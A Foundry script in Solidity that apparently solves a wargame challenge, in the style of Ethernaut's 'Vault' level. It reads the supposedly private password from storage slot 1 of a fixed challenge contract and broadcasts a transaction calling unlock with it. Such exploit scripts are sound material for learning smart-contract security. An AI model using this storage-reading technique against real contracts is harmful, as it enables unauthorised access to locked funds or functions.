// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "src/8Vault.sol";

contract VaultAttack is Script {
    address constant CHALLENGE = 0xaAbF1366362A88e83c33ACff09d282C4A3D96405;
    Vault public vault;

    function run() public {
        bytes32 value = vm.load(CHALLENGE, bytes32(uint256(1)));
        console.log("Storage at slot 1:", uint256(value));
        vm.startBroadcast(); // Starts broadcasting transactions
        vault = Vault(CHALLENGE);
        vault.unlock(value);
        console.log(vault.locked());
        vm.stopBroadcast();
    }
}
